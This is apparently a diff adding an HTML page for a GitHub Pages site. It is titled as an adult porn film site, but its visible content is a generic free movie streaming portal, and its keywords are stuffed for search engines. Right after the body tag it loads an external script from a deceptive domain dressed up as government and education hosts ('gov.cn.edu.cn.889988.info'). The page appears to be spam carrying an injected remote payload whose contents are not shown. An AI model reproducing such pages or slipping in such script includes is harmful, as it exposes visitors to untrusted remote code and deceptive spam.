@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>成人黄色电影网 - 高清影视在线观看 | chengrenhuangsedianyingwang-app.github.io</title>
+    <meta name="description" content="成人黄色电影网 (chengrenhuangsedianyingwang-app.github.io) 是专业的免费电影在线观看平台，提供最新动作片、喜剧片、科幻片高清资源，随时随地畅享视觉盛宴。">
+    <meta name="keywords" content="成人黄色电影网, chengrenhuangsedianyingwang-app.github.io, 免费电影, 在线观看, 高清影视, 动作片, 喜剧片">
+    <meta name="robots" content="index, follow">
+    <style>
+        /* 全局重置与基础样式 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+            background-color: #0a0a0f;
+            color: #e0e0e0;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        a {
+            text-decoration: none;
+            color: #00f3ff;
+            transition: all 0.3s ease;
+        }
+        a:hover {
+            color: #ff00ff;
+            text-shadow: 0 0 10px #ff00ff;
+        }
+        ul {
+            list-style: none;
+        }
+
+        /* 头部导航 - 玻璃拟态 */
+        header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(10, 10, 15, 0.85);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            border-bottom: 1px solid rgba(0, 243, 255, 0.2);
+        }
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 900;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px #00f3ff, 0 0 20px #00f3ff;
+        }
+        .logo span {
+            color: #ff00ff;
+            text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff;
+        }
+        nav ul {
+            display: flex;
+            gap: 25px;
+        }
+        nav ul li a {
+            font-size: 1rem;
+            font-weight: 600;
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+        nav ul li a:hover {
+            background: rgba(255, 0, 255, 0.1);
+        }
+
+        /* 主内容区 */
+        main {
+            margin-top: 80px;
+        }
+        section {
+            min-height: 100vh;
+            padding: 80px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .section-title {
+            font-size: 2.5rem;
+            margin-bottom: 40px;
+            text-align: center;
+            color: #fff;
+            text-shadow: 0 0 15px #00f3ff;
+            position: relative;
+        }
+        .section-title::after {
+            content: '';
+            display: block;
+            width: 100px;
+            height: 3px;
+            background: linear-gradient(90deg, #00f3ff, #ff00ff);
+            margin: 10px auto;
+            border-radius: 2px;
+        }
+
+        /* 首页 Hero 区 */
+        #home {
+            text-align: center;
+            background: radial-gradient(circle at center, rgba(0,243,255,0.05) 0%, transparent 70%);
+        }
+        .hero-title {
+            font-size: 4rem;
+            font-weight: 900;
+            color: transparent;
+            -webkit-text-stroke: 1px #00f3ff;
+            background: linear-gradient(45deg, #00f3ff, #ff00ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite alternate;
+        }
+        @keyframes pulse {
+            0% { text-shadow: 0 0 10px rgba(0,243,255,0.5); }
+            100% { text-shadow: 0 0 30px rgba(255,0,255,0.8); }
+        }
+        .hero-desc {
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto 40px;
+            color: #aaa;
+        }
+        .domain-badge {
+            display: inline-block;
+            padding: 15px 30px;
+            background: rgba(0, 243, 255, 0.1);
+            border: 1px solid #00f3ff;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            color: #00f3ff;
+            margin-bottom: 40px;
+            box-shadow: 0 0 15px rgba(0,243,255,0.2);
+        }
+
+        /* 电影分类网格 */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+        .category-card {
+            background: linear-gradient(145deg, #11111a, #0a0a0f);
+            border: 1px solid rgba(255, 0, 255, 0.3);
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            transition: transform 0.4s ease, box-shadow 0.4s ease;
+            cursor: pointer;
+        }
+        .category-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 30px rgba(255, 0, 255, 0.2);
+            border-color: #ff00ff;
+        }
+        .category-card h3 {
+            font-size: 1.5rem;
+            color: #fff;
+            margin-bottom: 15px;
+        }
+        .category-card p {
+            color: #888;
+            font-size: 0.9rem;
+        }
+
+        /* 热门推荐列表 */
+        .hot-list {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .hot-item {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 4px solid #00f3ff;
+            padding: 20px;
+            border-radius: 0 10px 10px 0;
+            transition: background 0.3s;
+        }
+        .hot-item:hover {
+            background: rgba(0, 243, 255, 0.1);
+        }
+        .hot-item .rank {
+            font-size: 2rem;
+            font-weight: 900;
+            color: #ff00ff;
+            margin-right: 20px;
+            text-shadow: 0 0 10px #ff00ff;
+        }
+        .hot-item .info h3 {
+            color: #fff;
+            margin-bottom: 5px;
+        }
+        .hot-item .info p {
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+
+        /* 关于我们 */
+        #about {
+            text-align: center;
+        }
+        .about-content {
+            background: rgba(255, 255, 255, 0.02);
+            padding: 50px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 243, 255, 0.2);
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        .about-content p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            color: #ccc;
+        }
+        .highlight {
+            color: #00f3ff;
+            font-weight: bold;
+        }
+
+        /* 页脚 */
+        footer {
+            background: #050508;
+            padding: 40px 20px;
+            text-align: center;
+            border-top: 1px solid rgba(255, 0, 255, 0.2);
+        }
+        footer p {
+            color: #666;
+            margin-bottom: 10px;
+        }
+        footer a {
+            color: #ff00ff;
+        }
+
+        /* 移动端自适应 */
+        @media (max-width: 768px) {
+            .nav-container {
+                flex-direction: column;
+                gap: 15px;
+            }
+            nav ul {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 10px;
+            }
+            .hero-title {
+                font-size: 2.5rem;
+            }
+            .section-title {
+                font-size: 2rem;
+            }
+            section {
+                padding: 60px 15px;
+                min-height: auto;
+            }
+            .hot-item {
+                flex-direction: column;
+                text-align: center;
+                border-left: none;
+                border-top: 4px solid #00f3ff;
+                border-radius: 10px;
+            }
+            .hot-item .rank {
+                margin-right: 0;
+                margin-bottom: 10px;
+            }
+            .about-content {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+    <header>
+        <div class="nav-container">
+            <div class="logo">成人黄色<span>电影网</span></div>
+            <nav>
+                <ul>
+                    <li><a href="#home">首页</a></li>
+                    <li><a href="#categories">电影分类</a></li>
+                    <li><a href="#hot">热门推荐</a></li>
+                    <li><a href="#about">关于我们</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <!-- 栏目一：首页 -->
+        <section id="home">
+            <h1 class="hero-title">成人黄色电影网</h1>
+            <p class="hero-desc">汇聚全球高清影视资源，打造极致观影体验。无需下载，一键播放，随时随地畅享最新大片。</p>
+            <div class="domain-badge">官方网址：chengrenhuangsedianyingwang-app.github.io</div>
+            <div class="grid-container">
+                <div class="category-card">
+                    <h3>极速播放</h3>
+                    <p>依托 GitHub Pages 稳定加速，全网最快加载速度。</p>
+                </div>
+                <div class="category-card">
+                    <h3>海量资源</h3>
+                    <p>涵盖各类影视分类，满足您的不同口味。</p>
+                </div>
+                <div class="category-card">
+                    <h3>免费观看</h3>
+                    <p>成人黄色电影网承诺永久免费，无广告打扰。</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目二：电影分类 -->
+        <section id="categories">
+            <h2 class="section-title">电影分类</h2>
+            <div class="grid-container">
+                <div class="category-card">
+                    <h3>🔥 动作片</h3>
+                    <p>震撼特效与激烈打斗，体验肾上腺素飙升的快感。</p>
+                </div>
+                <div class="category-card">
+                    <h3>😂 喜剧片</h3>
+                    <p>轻松幽默的剧情，为您带来欢声笑语。</p>
+                </div>
+                <div class="category-card">
+                    <h3>🚀 科幻片</h3>
+                    <p>探索未来世界与未知宇宙，激发无限想象。</p>
+                </div>
+                <div class="category-card">
+                    <h3>💖 爱情片</h3>
+                    <p>感人至深的情感故事，触动心灵最柔软的地方。</p>
+                </div>
+                <div class="category-card">
+                    <h3>👻 恐怖片</h3>
+                    <p>紧张刺激的惊悚氛围，挑战你的心理极限。</p>
+                </div>
+                <div class="category-card">
+                    <h3>🎭 剧情片</h3>
+                    <p>深刻的社会洞察与人物刻画，引发深思。</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目三：热门推荐 -->
+        <section id="hot">
+            <h2 class="section-title">热门推荐</h2>
+            <div class="hot-list">
+                <div class="hot-item">
+                    <div class="rank">1</div>
+                    <div class="info">
+                        <h3>沙丘 2 (2024)</h3>
+                        <p>保罗·厄崔迪与弗雷曼人联手，踏上复仇与救赎的史诗之旅。</p>
+                    </div>
+                </div>
+                <div class="hot-item">
+                    <div class="rank">2</div>
+                    <div class="info">
+                        <h3>奥本海默 (2023)</h3>
+                        <p>原子弹之父的传奇人生，诺兰执导的烧脑神作。</p>
+                    </div>
+                </div>
+                <div class="hot-item">
+                    <div class="rank">3</div>
+                    <div class="info">
+                        <h3>坠落的审判 (2023)</h3>
+                        <p>戛纳金棕榈奖作品，一场扑朔迷离的死亡之谜。</p>
+                    </div>
+                </div>
+                <div class="hot-item">
+                    <div class="rank">4</div>
+                    <div class="info">
+                        <h3>哥斯拉大战金刚 2 (2024)</h3>
+                        <p>怪兽宇宙巅峰对决，开启全新的地下世界冒险。</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目四：关于我们 -->
+        <section id="about">
+            <h2 class="section-title">关于 成人黄色电影网</h2>
+            <div class="about-content">
+                <p>欢迎访问 <span class="highlight">成人黄色电影网</span>（网址：<a href="https://chengrenhuangsedianyingwang-app.github.io">chengrenhuangsedianyingwang-app.github.io</a>）。我们致力于为广大影迷提供一个纯净、高清、免费的在线观影平台。</p>
+                <p>作为新一代的影视聚合站点，成人黄色电影网依托先进的技术架构，确保每一位用户都能获得流畅的播放体验。无论您身处何地，只需打开浏览器，即可畅享海量影视资源。</p>
+                <p>本站严格遵守版权法规，所有资源均来自互联网公开分享，仅供测试和学习交流使用。如果您喜欢我们的网站，请收藏并分享给您的朋友！</p>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>© 2024 成人黄色电影网. All Rights Reserved.</p>
+        <p>官方网址：<a href="https://chengrenhuangsedianyingwang-app.github.io">chengrenhuangsedianyingwang-app.github.io</a></p>
+        <p>关键词：成人黄色电影网、chengrenhuangsedianyingwang-app.github.io、免费高清电影</p>
+    </footer>
+
+    <script>
+        // 平滑滚动与导航高亮
+        document.querySelectorAll('nav a').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href').substring(1);
+                const targetSection = document.getElementById(targetId);
+                if (targetSection) {
+                    window.scrollTo({
+                        top: targetSection.offsetTop - 80,
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+
+        // 简单的滚动动画触发
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = 1;
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, { threshold: 0.1 });
+
+        document.querySelectorAll('section').forEach(section => {
+            section.style.opacity = 0;
+            section.style.transform = 'translateY(20px)';
+            section.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
+            observer.observe(section);
+        });
+    </script>
+</body>
+</html>
